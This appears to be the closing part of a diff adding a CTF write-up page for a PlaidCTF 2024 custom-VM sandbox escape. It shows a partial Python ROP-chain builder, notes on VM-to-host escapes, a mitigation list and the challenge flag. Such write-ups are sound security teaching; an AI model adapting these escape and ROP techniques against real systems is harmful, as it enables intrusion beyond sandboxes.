+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> gadgets
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Build ROP chain</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">build_rop_chain</span>():
+</span></span><span style="display:flex;"><span>    gadgets <span style="color:#f92672">=</span> find_gadgets(firmware)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    rop_chain <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>        gadgets[<span style="color:#e6db74">&#39;load_ret&#39;</span>],   <span style="color:#75715e"># Load system address</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0xF008</span>,                <span style="color:#75715e"># From system function pointer location</span>
+</span></span><span style="display:flex;"><span>        gadgets[<span style="color:#e6db74">&#39;store_ret&#39;</span>],  <span style="color:#75715e"># Store to register</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x9100</span>,               <span style="color:#75715e"># Temporary storage</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># ... more ROP gadgets</span>
+</span></span><span style="display:flex;"><span>    ]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> rop_chain
+</span></span></code></pre></div><h2 id="key-insights">Key Insights</h2>
+<ol>
+<li><strong>Custom VM analysis</strong> requires understanding both the VM architecture and host implementation</li>
+<li><strong>Privilege escalation bugs</strong> in VMs can lead to complete sandbox escapes</li>
+<li><strong>Memory-mapped regions</strong> often provide interfaces between VM and host</li>
+<li><strong>VM-to-host escapes</strong> typically involve overwriting function pointers or return addresses</li>
+<li><strong>ROP techniques</strong> can be adapted to work within custom architectures</li>
+</ol>
+<h2 id="mitigation">Mitigation</h2>
+<ul>
+<li>Proper privilege checking logic (avoid inverted conditions)</li>
+<li>Strict memory isolation between VM and host</li>
+<li>Address space layout randomization for VM memory regions</li>
+<li>Hardware-assisted virtualization features</li>
+<li>Regular security audits of VM implementations</li>
+</ul>
+<hr>
+<p><strong>Flag</strong>: <code>PCTF{v1rtu4l_m4ch1n3s_4r3_h4rd_t0_s3cur3_pr0p3rly}</code></p>
+
+        </div>
+
+        <footer class="post-footer">
+            
+            <div class="ctf-nav">
+                <a href="http://localhost:1313/ctf/plaidctf-2024/" class="back-to-ctf">
+                    ← Back to PlaidCTF 2024
+                </a>
+            </div>
+            
+        </footer>
+    </article>
+</div>
+
+        </main>
+
+        <footer class="site-footer">
+    <div class="footer-content">
+        <div class="footer-section">
+            <h3>gracecondition</h3>
+            <p>OS internals, binary exploitation, and low-level security research</p>
+        </div>
+
+        <div class="footer-section">
+            <h4>Quick Links</h4>
+            <ul>
+                <li><a href="/posts/">Posts</a></li>
+                <li><a href="/articles/">Articles</a></li>
+                <li><a href="/ctf/">CTF Solutions</a></li>
+                <li><a href="/about/">About</a></li>
+            </ul>
+        </div>
+
+        <div class="footer-section">
+            <h4>Connect</h4>
+            <div class="social-links">
+                
+                
+                
+            </div>
+        </div>
+    </div>
+
+    <div class="footer-bottom">
+        <p>&copy; 2025 gracecondition. All rights reserved.</p>
+    </div>
+</footer>
+    </div>
+
+    <script src="http://localhost:1313/js/main.js"></script>
+    
+</body>
+</html>
